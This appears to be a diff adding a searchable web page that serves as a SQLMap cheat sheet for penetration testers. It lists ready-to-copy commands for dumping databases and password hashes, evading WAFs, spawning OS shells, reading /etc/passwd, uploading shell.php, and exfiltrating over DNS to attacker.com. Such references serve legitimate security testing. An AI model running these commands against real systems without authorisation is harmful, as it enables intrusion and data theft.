@@ -1,0 +1,244 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font-mono);font-size:13px}
+h2.sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)}
+.top{padding:1.25rem 0 1rem}
+.top h1{font-family:var(--font-sans);font-size:20px;font-weight:500;color:var(--color-text-primary);margin-bottom:4px}
+.top p{font-size:13px;color:var(--color-text-secondary);font-family:var(--font-sans)}
+.search-bar{display:flex;gap:8px;margin:1rem 0}
+.search-bar input{flex:1;font-family:var(--font-mono);font-size:13px;padding:7px 12px}
+.tabs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:1rem}
+.tab{padding:5px 12px;font-size:12px;font-family:var(--font-sans);border:0.5px solid var(--color-border-secondary);border-radius:999px;background:transparent;color:var(--color-text-secondary);cursor:pointer;transition:all .15s}
+.tab:hover{background:var(--color-background-secondary)}
+.tab.active{background:var(--color-text-primary);color:var(--color-background-primary);border-color:var(--color-text-primary)}
+.section{margin-bottom:1.5rem}
+.section-title{font-family:var(--font-sans);font-size:13px;font-weight:500;color:var(--color-text-secondary);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.6rem;padding-bottom:.4rem;border-bottom:0.5px solid var(--color-border-tertiary)}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:8px}
+.card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:.75rem 1rem;cursor:pointer;transition:border-color .15s}
+.card:hover{border-color:var(--color-border-secondary)}
+.cmd{font-family:var(--font-mono);font-size:12px;color:#1D9E75;word-break:break-all;margin-bottom:5px;line-height:1.5}
+.desc{font-family:var(--font-sans);font-size:12px;color:var(--color-text-secondary);line-height:1.5}
+.badge{display:inline-block;font-size:10px;font-family:var(--font-sans);padding:2px 7px;border-radius:999px;margin-bottom:6px}
+.badge.danger{background:#FCEBEB;color:#A32D2D}
+.badge.warn{background:#FAEEDA;color:#854F0B}
+.badge.info{background:#E6F1FB;color:#185FA5}
+.badge.ok{background:#EAF3DE;color:#3B6D11}
+.badge.purple{background:#EEEDFE;color:#534AB7}
+.copy-btn{float:right;font-size:10px;font-family:var(--font-sans);border:0.5px solid var(--color-border-tertiary);border-radius:4px;padding:2px 7px;background:transparent;color:var(--color-text-secondary);cursor:pointer;opacity:0;transition:opacity .15s}
+.card:hover .copy-btn{opacity:1}
+.copy-btn.copied{color:#1D9E75;border-color:#1D9E75}
+.no-results{font-family:var(--font-sans);color:var(--color-text-secondary);padding:2rem 0;text-align:center;font-size:14px}
+@media(prefers-color-scheme:dark){.badge.danger{background:#501313;color:#F09595}.badge.warn{background:#412402;color:#FAC775}.badge.info{background:#042C53;color:#85B7EB}.badge.ok{background:#173404;color:#C0DD97}.badge.purple{background:#26215C;color:#AFA9EC}.cmd{color:#5DCAA5}}
+</style>
+
+<h2 class="sr-only">SQLMap cheat sheet — searchable reference of commands, options and techniques</h2>
+
+<div class="top">
+  <h1><i class="ti ti-database-leak" aria-hidden="true" style="font-size:20px;vertical-align:-2px;margin-right:8px"></i>SQLMap cheat sheet</h1>
+  <p>Searchable reference for penetration testers. Click any card to copy the command.</p>
+</div>
+
+<div class="search-bar">
+  <input type="text" id="q" placeholder="Search commands, flags, keywords…" oninput="filter()">
+</div>
+
+<div class="tabs" id="tabs"></div>
+<div id="content"></div>
+
+<script>
+const DATA = [
+  {cat:"basics", label:"Basics & detection", items:[
+    {cmd:"sqlmap -u 'http://target.com/page?id=1'", desc:"Basic scan on a GET parameter", tag:"info"},
+    {cmd:"sqlmap -u 'http://target.com/page?id=1' --dbs", desc:"Enumerate all databases after detection", tag:"info"},
+    {cmd:"sqlmap -u 'http://target.com/login' --data='user=a&pass=b'", desc:"Test POST parameters", tag:"info"},
+    {cmd:"sqlmap -u 'http://target.com/page?id=1' --batch", desc:"Auto-select defaults, no prompts (great for scripting)", tag:"ok"},
+    {cmd:"sqlmap -u 'http://target.com/page?id=1' --level=5 --risk=3", desc:"Max aggression: level 5 (more tests), risk 3 (destructive payloads). Use with care.", tag:"danger"},
+    {cmd:"sqlmap -u 'http://target.com/page?id=1' -p id", desc:"Specify which parameter to test", tag:"info"},
+    {cmd:"sqlmap -u 'http://target.com/page?id=1*'", desc:"Mark injection point manually with *", tag:"warn"},
+    {cmd:"sqlmap -r request.txt", desc:"Load a raw HTTP request from Burp/ZAP", tag:"ok"},
+    {cmd:"sqlmap -r request.txt -p username", desc:"Load raw request and specify parameter to inject", tag:"ok"},
+    {cmd:"sqlmap -u 'http://target.com/page?id=1' --crawl=2", desc:"Crawl site up to 2 levels deep to find injectable parameters", tag:"warn"},
+  ]},
+  {cat:"enum", label:"Enumeration", items:[
+    {cmd:"sqlmap -u 'URL' --dbs", desc:"List all databases", tag:"info"},
+    {cmd:"sqlmap -u 'URL' -D dbname --tables", desc:"List tables in a specific database", tag:"info"},
+    {cmd:"sqlmap -u 'URL' -D dbname -T tablename --columns", desc:"List columns in a specific table", tag:"info"},
+    {cmd:"sqlmap -u 'URL' -D dbname -T tablename --dump", desc:"Dump all rows from a table", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' -D dbname -T users -C username,password --dump", desc:"Dump specific columns only", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --dump-all --exclude-sysdbs", desc:"Dump everything, skipping system databases", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --current-db", desc:"Get the currently active database", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --current-user", desc:"Get the current DB user", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --users", desc:"List all DB users", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --passwords", desc:"Attempt to retrieve DB user password hashes", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --privileges", desc:"Check privileges for current/all DB users", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --roles", desc:"List roles assigned to DB users (Oracle)", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --schema", desc:"Retrieve the entire DB schema", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --count", desc:"Show row count for tables without dumping data", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' -D dbname -T tablename --start=1 --stop=50", desc:"Dump only rows 1–50 (pagination)", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' -D dbname -T users --where=\"admin=1\"", desc:"Dump with a WHERE filter", tag:"ok"},
+  ]},
+  {cat:"injection", label:"Injection techniques", items:[
+    {cmd:"sqlmap -u 'URL' --technique=B", desc:"Boolean-based blind only", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --technique=E", desc:"Error-based only", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --technique=U", desc:"UNION query-based only", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --technique=S", desc:"Stacked queries only", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --technique=T", desc:"Time-based blind only", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --technique=Q", desc:"Inline queries only", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --technique=BEUSTQ", desc:"All techniques (default)", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --union-cols=10-20", desc:"Hint UNION column range when auto-detection fails", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --union-char='NULL'", desc:"Override UNION column fill character", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --time-sec=10", desc:"Set time-based delay threshold (default 5s)", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --second-order='http://target.com/profile'", desc:"Second-order injection: inject at URL, verify at second URL", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --dbms=mysql", desc:"Force a specific DBMS to skip fingerprint step", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --dbms=mssql", desc:"Force Microsoft SQL Server DBMS", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --dbms=oracle", desc:"Force Oracle DBMS", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --dbms=postgresql", desc:"Force PostgreSQL DBMS", tag:"info"},
+  ]},
+  {cat:"bypass", label:"WAF bypass & tamper", items:[
+    {cmd:"sqlmap -u 'URL' --random-agent", desc:"Use a random User-Agent to evade basic fingerprinting", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --tamper=space2comment", desc:"Replace spaces with /* */ comments to bypass WAFs", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=between", desc:"Replace > with BETWEEN x AND y", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=equaltolike", desc:"Replace = with LIKE operator", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=randomcase", desc:"Randomize keyword case (SeLeCT etc.)", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=charencode", desc:"URL-encode every character in payloads", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=chardoubleencode", desc:"Double URL-encode payloads", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=unmagicquotes", desc:"Replace ' with a multi-byte combo", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=space2comment,randomcase,charencode", desc:"Stack multiple tamper scripts", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --tamper=modsecurityversioned", desc:"Bypass ModSecurity using versioned comments", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --tamper=versionedmorekeywords", desc:"Wrap keywords in MySQL versioned comments", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --skip-waf", desc:"Skip the automatic WAF/IPS detection", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --delay=2", desc:"Add 2-second delay between requests to avoid rate limits", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --safe-url='http://target.com/' --safe-freq=5", desc:"Visit a safe URL every 5 requests to keep session alive", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --proxy='http://127.0.0.1:8080'", desc:"Route through Burp Suite or any HTTP proxy", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --proxy-cred=user:pass", desc:"Authenticate to a proxy requiring credentials", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --tor --tor-type=SOCKS5", desc:"Route through Tor for anonymity", tag:"warn"},
+  ]},
+  {cat:"auth", label:"Authentication & sessions", items:[
+    {cmd:"sqlmap -u 'URL' --cookie='session=abc123; auth=xyz'", desc:"Supply session cookies", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' -H 'Authorization: Bearer TOKEN'", desc:"Supply a custom header (e.g. JWT auth)", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' -H 'X-Forwarded-For: 127.0.0.1'", desc:"Inject custom headers to bypass IP restrictions", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --auth-type=Basic --auth-cred=admin:pass", desc:"HTTP Basic authentication", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --auth-type=Digest --auth-cred=user:pass", desc:"HTTP Digest authentication", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --auth-type=NTLM --auth-cred=domain\\user:pass", desc:"NTLM / Windows authentication", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --data='user=a&pass=b' --csrf-token=csrf_token --csrf-url='http://target.com/login'", desc:"Auto-fetch and inject CSRF token", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --keep-alive", desc:"Reuse TCP connections (HTTP keep-alive)", tag:"info"},
+  ]},
+  {cat:"os", label:"OS & file access", items:[
+    {cmd:"sqlmap -u 'URL' --os-shell", desc:"Attempt to spawn an interactive OS shell via xp_cmdshell, UDF, etc.", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --os-cmd='whoami'", desc:"Execute a single OS command and return output", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --file-read='/etc/passwd'", desc:"Read a file from the server filesystem", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --file-write='shell.php' --file-dest='/var/www/html/shell.php'", desc:"Upload a local file to the server", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --priv-esc", desc:"Attempt DB privilege escalation to DBA level", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --is-dba", desc:"Check if the current DB user has DBA privileges", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --sql-shell", desc:"Spawn an interactive SQL shell", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --sql-query='SELECT @@version'", desc:"Run an arbitrary SQL query", tag:"warn"},
+  ]},
+  {cat:"output", label:"Output & performance", items:[
+    {cmd:"sqlmap -u 'URL' -v 3", desc:"Verbose level 3 (shows injected payloads). Range: 0–6", tag:"info"},
+    {cmd:"sqlmap -u 'URL' -v 6", desc:"Max verbosity — shows HTTP requests and responses", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --output-dir=/tmp/scan1", desc:"Save results to a custom directory", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --format=CSV --dump ...", desc:"Dump results as CSV", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' -t /tmp/traffic.txt", desc:"Log all HTTP traffic to a file", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --threads=5", desc:"Use 5 parallel threads (default 1, max 10)", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --fresh-queries", desc:"Ignore cached results from previous runs", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --flush-session", desc:"Clear all stored session data and start fresh", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --answers='crack=N,follow=Y'", desc:"Pre-answer prompts for full automation", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --smart", desc:"Only test parameters showing signs of injection", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --no-cast", desc:"Disable result casting (fix encoding issues)", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --string='Welcome'", desc:"Use a string from a valid response as true-page indicator", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --code=200", desc:"Use HTTP status code as true-page indicator", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --titles", desc:"Compare page titles instead of bodies", tag:"info"},
+  ]},
+  {cat:"advanced", label:"Advanced & special", items:[
+    {cmd:"sqlmap -u 'URL' --hostname", desc:"Retrieve the DB server hostname", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --banner", desc:"Retrieve the DBMS version banner", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --forms", desc:"Auto-detect and test all forms on the page", tag:"warn"},
+    {cmd:"sqlmap -m targets.txt --batch --dbs", desc:"Mass scan a list of URLs from a file", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --scope='http://target.com'", desc:"Restrict crawl/scan to a domain scope", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --suffix='-- -'", desc:"Append a suffix to every payload (comment out the rest)", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --prefix='%'", desc:"Prepend a string to every payload", tag:"warn"},
+    {cmd:"sqlmap -u 'URL' --invalid-bignum", desc:"Use large integers for false-condition injections", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --no-escape", desc:"Disable string escape (quote escaping)", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --hex", desc:"Use hex encoding for retrieved strings (DBMS-level encoding)", tag:"info"},
+    {cmd:"sqlmap -u 'URL' --dns-domain=attacker.com", desc:"Enable DNS exfiltration via a domain you control", tag:"danger"},
+    {cmd:"sqlmap -u 'URL' --all", desc:"Retrieve everything: users, passwords, dbs, tables, dump all", tag:"danger"},
+    {cmd:"python sqlmap.py --wizard", desc:"Interactive wizard for beginners", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --list-tampers", desc:"Show all available tamper scripts", tag:"ok"},
+    {cmd:"sqlmap -u 'URL' --identify-waf", desc:"Identify the WAF/IPS product protecting the target", tag:"info"},
+  ]},
+];
+
+const TAGS = {info:"info",warn:"warn",ok:"ok",danger:"danger",purple:"purple"};
+const LABELS = {info:"detection",warn:"caution",ok:"safe",danger:"destructive",purple:"special"};
+
+let activeTab = "all";
+
+function buildTabs(){
+  const cont = document.getElementById("tabs");
+  const all = document.createElement("button");
+  all.className="tab active"; all.textContent="All"; all.dataset.cat="all";
+  all.onclick=()=>setTab("all");
+  cont.appendChild(all);
+  DATA.forEach(s=>{
+    const b=document.createElement("button");
+    b.className="tab"; b.textContent=s.label; b.dataset.cat=s.cat;
+    b.onclick=()=>setTab(s.cat);
+    cont.appendChild(b);
+  });
+}
+
+function setTab(cat){
+  activeTab=cat;
+  document.querySelectorAll(".tab").forEach(t=>{
+    t.classList.toggle("active", t.dataset.cat===cat);
+  });
+  filter();
+}
+
+function makeBadge(tag){
+  return `<span class="badge ${tag}">${LABELS[tag]||tag}</span>`;
+}
+
+function copyCmd(el, cmd){
+  navigator.clipboard.writeText(cmd).then(()=>{
+    el.textContent="copied!"; el.classList.add("copied");
+    setTimeout(()=>{el.textContent="copy"; el.classList.remove("copied");},1500);
+  });
+}
+
+function filter(){
+  const q = document.getElementById("q").value.toLowerCase();
+  const content = document.getElementById("content");
+  content.innerHTML="";
+  let any=false;
+  DATA.forEach(sec=>{
+    if(activeTab!=="all" && activeTab!==sec.cat) return;
+    const items = sec.items.filter(it=>{
+      if(!q) return true;
+      return it.cmd.toLowerCase().includes(q)||it.desc.toLowerCase().includes(q);
+    });
+    if(!items.length) return;
+    any=true;
+    const div=document.createElement("div"); div.className="section";
+    div.innerHTML=`<div class="section-title">${sec.label}</div><div class="cards" id="cards-${sec.cat}"></div>`;
+    content.appendChild(div);
+    const grid=div.querySelector(`#cards-${sec.cat}`);
+    items.forEach(it=>{
+      const card=document.createElement("div"); card.className="card";
+      card.innerHTML=`${makeBadge(it.tag)}<button class="copy-btn" onclick="event.stopPropagation();copyCmd(this,'${it.cmd.replace(/'/g,"\\'")}')">copy</button><div class="cmd">${it.cmd.replace(/</g,"&lt;")}</div><div class="desc">${it.desc}</div>`;
+      card.onclick=()=>{
+        const btn=card.querySelector(".copy-btn");
+        copyCmd(btn, it.cmd);
+      };
+      grid.appendChild(card);
+    });
+  });
+  if(!any){
+    content.innerHTML=`<div class="no-results"><i class="ti ti-search-off" aria-hidden="true" style="font-size:24px;display:block;margin-bottom:.5rem"></i>No commands matched "<strong>${q}</strong>"</div>`;
+  }
+}
+
+buildTabs();
+filter();
+</script>
